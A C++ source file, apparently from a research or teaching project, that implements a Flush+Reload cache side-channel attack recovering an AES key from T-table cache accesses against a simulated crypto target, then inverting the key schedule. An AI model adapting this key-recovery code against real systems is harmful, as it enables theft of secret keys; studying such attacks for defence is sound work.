#include <iostream>
#include <functional>
#include "AttackProgram.h"
#include "Random.h"
#include "Log.h"
#include "util.h"

const unsigned int AttackProgram::LOG = 2;
const unsigned int AttackProgram::DEFAULT_TEXT_MAX = 100000;
const uint32_t AttackProgram::COUNTER_THRESHOLD = 0;

const std::function<uint8_t(uint32_t)> INT2Q_FUNC[] = {
	util::int32toq0, util::int32toq1, util::int32toq2, util::int32toq3
};

AttackProgram::AttackProgram() : AttackProgram(DEFAULT_TEXT_MAX)
{
}

AttackProgram::AttackProgram(unsigned int text_max) : text_max_((text_max) ? text_max : DEFAULT_TEXT_MAX), reload_counter_{}, recovered_last_round_key_{}, recovered_secret_key_{}
{
}


AttackProgram::~AttackProgram()
{
}

void AttackProgram::attack(const CryptoProgram &cryptoProg)
{
	CryptoProgram::text_t plain_text;
	CryptoProgram::text_t cipher_text;
	bool is_cl_enabled[4];

	if (LOG >= 1) {
		Log::out << LOG << text_max_ << COUNTER_THRESHOLD << 0;
	}

	for (unsigned int i = 0; i < text_max_; ++i) {
		for (auto &p : plain_text)
			p = Random::next_u32();

		//Flusing stage
		CryptoProgram::flush_tables();

		//Target accessing stage
		util::switch_to_thread();
		cryptoProg.encrypt(plain_text, cipher_text);

		//Reload stage
		for (unsigned int table_no = 0; table_no < 4; ++table_no)
			is_cl_enabled[table_no] = CryptoProgram::table[table_no].is_cached(0);

		for (unsigned int table_no = 0; table_no < 4; ++table_no) {
			//if (is_cl_enabled[table_no] || CryptoProgram::table[table_no].is_cached_correct(0))
			if (is_cl_enabled[table_no])
				continue;

			for (unsigned int j = 0; j < 16; ++j)
				++reload_counter_[j][INT2Q_FUNC[j % 4](cipher_text[j / 4])][table_no];
		}
	}

	if (LOG >= 1) {
		for (size_t i = 0; i < COUNTER_PART; ++i)
			for (size_t j = 0; j < COUNTER_PART_MAX; ++j)
				for (size_t k = 0; k < 4; ++k)
					Log::out << reload_counter_[i][j][k];
	}
}

void AttackProgram::last_round_key_recover()
{
	uint32_t key_candidate[16][256] = {};

	for (size_t i = 0; i < 16; ++i)
		for (unsigned int j = 0; j < 256; ++j) {
			if (reload_counter_[i][j][(i + 2) % 4] > COUNTER_THRESHOLD)
				continue;
			for (size_t k = 0; k < CryptoProgram::table_t::CACHE_LINE_SIZE; ++k) {
				//uint32_t gen_key = int2q_func[i % 4](CryptoProgram::table[(i + 2) % 4][k]) ^ j;
				unsigned int gen_key = CryptoProgram::sbox[k] ^ j;
				++key_candidate[i][gen_key];
			}
		}

	for (size_t i = 0; i < 16; ++i) {
		size_t max_it = 0;
		uint32_t max_value = 0;
		for (size_t j = 0; j < 256; ++j) {
			if (max_value >= key_candidate[i][j])
				continue;
			max_it = j;
			max_value = key_candidate[i][j];
		}

		recovered_last_round_key_[i / 4] <<= 8;
		recovered_last_round_key_[i / 4] ^= max_it;
	}

	if (LOG >= 2) {
		for (size_t i = 0; i < 16; ++i)
			for (uint32_t j = 0; j < 256; ++j)
				Log::out << key_candidate[i][j];
	}

	if (LOG >= 1) {
		Log::out << recovered_last_round_key_;
	}
}

void AttackProgram::secret_key_recover()
{
	uint32_t full_round_key[CryptoProgram::ROUND_KEY_SIZE];
	for (size_t i = 0; i < 4; ++i)
		full_round_key[40 + i] = recovered_last_round_key_[i];

	uint32_t temp;
	for (int i = 40 - 1; i >= 0; --i) {
		temp = full_round_key[i + 4 - 1];
		if (i % 4 == 0)
			temp =
			(CryptoProgram::table[2][util::int32toq1(temp)] & 0xff000000) ^
			(CryptoProgram::table[3][util::int32toq2(temp)] & 0x00ff0000) ^
			(CryptoProgram::table[0][util::int32toq3(temp)] & 0x0000ff00) ^
			(CryptoProgram::table[1][util::int32toq0(temp)] & 0x000000ff) ^
			CryptoProgram::rcon[i / 4 + 1];
		full_round_key[i] = full_round_key[i + 4] ^ temp;
	}

	for (size_t i = 0; i < 4; ++i)
		recovered_secret_key_[i] = full_round_key[i];

	if (LOG >= 1) {
		Log::out << recovered_secret_key_;
	}
}
